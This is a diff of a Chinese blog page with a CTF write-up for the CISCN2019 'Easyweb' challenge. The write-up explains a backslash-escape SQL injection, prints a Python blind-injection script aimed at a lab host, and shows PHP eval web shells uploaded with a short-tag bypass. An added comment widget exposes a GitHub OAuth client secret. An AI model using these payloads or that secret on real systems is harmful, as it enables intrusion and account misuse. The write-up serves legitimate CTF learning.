@@ -11,22 +11,22 @@
   <meta name="author" content="kveln">
   <title>[CISCN2019 总决赛 Day2 Web1]Easyweb |  </title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
-  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- <link href="http://localhost:4000/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="http://localhost:4000/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="[CISCN2019 总决赛 Day2 Web1]Easyweb |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="[CISCN2019 总决赛 Day2 Web1]Easyweb |   » Feed" href="http://localhost:4000/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
-  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <link href="http://localhost:4000/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/jquery.min.js"></script> -->
   <script>hljs.initHighlightingOnLoad();</script>
   
 
     <meta property="og:description" content="[CISCN2019 总决赛 Day2 Web1]Easyweb"/>
-    <meta property="og:url" content="https://guokeya.github.io/post/ciscn2019-zong-jue-sai-day2-web1easyweb/"/>
+    <meta property="og:url" content="http://localhost:4000/post/ciscn2019-zong-jue-sai-day2-web1easyweb/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content=" "/>
@@ -35,7 +35,7 @@
   	<!-- Navigation -->
   <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
-      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <a class="navbar-brand" href="http://localhost:4000"> </a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
         Menu
         <i class="fas fa-bars"></i>
@@ -72,7 +72,7 @@
     </div>
   </nav>
   <!-- Page Header -->
-  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+  <header class="masthead" style="background-image: url('http://localhost:4000/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
@@ -80,9 +80,9 @@
           <div class="post-heading">
           	<span class="tags">
           	 
-            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            <a href="http://localhost:4000/tag/CTF/" class="tag">CTF</a>
             
-            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            <a href="http://localhost:4000/tag/Web/" class="tag">Web安全</a>
             
         </span>
             <h1>[CISCN2019 总决赛 Day2 Web1]Easyweb</h1>
@@ -102,13 +102,13 @@
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
           <p>看见界面。一个登陆框。<br>
-<img src="https://guokeya.github.io/post-images/1579835519439.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1579835519439.png" alt="" loading="lazy"><br>
 尝试register.php。。并没有。看下robots.txt</p>
 <!-- more -->
-<p><img src="https://guokeya.github.io/post-images/1579835537544.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1579835537544.png" alt="" loading="lazy"><br>
 然而。index.php并没有bak备份<br>
 看源代码。发现个image.php还带id？十有八九sql注入<br>
-<img src="https://guokeya.github.io/post-images/1579835581185.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1579835581185.png" alt="" loading="lazy"><br>
 访问下image.php.bak。成功下载文件</p>
 <pre><code>&lt;?php
 include &quot;config.php&quot;;
@@ -129,14 +129,14 @@ readfile($path);
 替换了\0，但其实替换的是\0，因为\会转义为普通<br>
 这里本地写了段代码。测试下<br>
 发现\0会被转义为\\0，进行过滤时。就会将\0给替换为空。只剩下\\。而\表示转义。多余的\就会逃逸<br>
-<img src="https://guokeya.github.io/post-images/1579835917737.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1579835917737.png" alt="" loading="lazy"></p>
 <pre><code>select * from images where id='\\\' or path=''
 导致id处的后半个单引号被\转义。id的值为\\\' or path
 path可控。我们就可以通过#去注释path的后半个单引号
 select * from iamges where id='\\\' or path=' or 1#
 即可返回正常
 </code></pre>
-<p><img src="https://guokeya.github.io/post-images/1579836138995.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1579836138995.png" alt="" loading="lazy"><br>
 由于这里没有回显。我们可以通过盲注。进行注入</p>
 <pre><code>import requests
 url=r'http://a563b70a-acef-493b-aacd-34608c733374.node3.buuoj.cn/image.php?id=\\0&amp;path=or '
@@ -193,21 +193,21 @@ datalen=dump()
 <p>得到admin,d6948837c00b44421607<br>
 登陆后。有个上传。随便传点东西<br>
 我传了个FUZZ.txt<br>
-<img src="https://guokeya.github.io/post-images/1579840462602.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1579840462602.png" alt="" loading="lazy"><br>
 访问。貌似。会将我们的用户名和文件名写入这个php文件<br>
-<img src="https://guokeya.github.io/post-images/1579840512990.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1579840512990.png" alt="" loading="lazy"><br>
 尝试。直接写个eval($_POST[a]);</p>
-<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1579840556320.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="http://localhost:4000/post-images/1579840556320.png" alt="" loading="lazy"></figure>
 <p>然而不行。再次尝试<code>&lt;?php eval($_POST[a]);?&gt;</code><br>
 提示禁止php<br>
 尝试用PHP的短标签绕过<br>
 <code>&lt;?=@eval($_POST['a']);?&gt;</code><br>
 成功上传。执行命令<br>
-<img src="https://guokeya.github.io/post-images/1579840641955.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1579840641955.png" alt="" loading="lazy"></p>
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/ji-lu-yi-ti-fei-chang-nao-dong-de-misc/">
+            <a href="http://localhost:4000/post/ji-lu-yi-ti-fei-chang-nao-dong-de-misc/">
               <span class="post-title">
                 纪录一题非常。。脑洞的MISC&rarr;
               </span>
@@ -216,6 +216,26 @@ datalen=dump()
         
         <div class="comment">
           
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
         </div>
       </div>
     </div>
@@ -251,7 +271,7 @@ datalen=dump()
             
               
               <li class="list-inline-item">
-              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+              <a href="http://localhost:4000/atom.xml" target="_blank">
                 <span class="fa-stack fa-lg">
                   <i class="fas fa-circle fa-stack-2x"></i>
                   <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
@@ -259,17 +279,17 @@ datalen=dump()
               </a>
               </li>
           </ul>
-          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea</a></p>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br >浙ICP备2021000950号-1</a></p>
         </div>
       </div>
     </div>
    </footer>
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/bootstrap.bundle.min.js"></script> -->
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/clean-blog.min.js"></script> -->
   <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
   <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
 <a id="back_to_top" href="#" class="back_to_top">
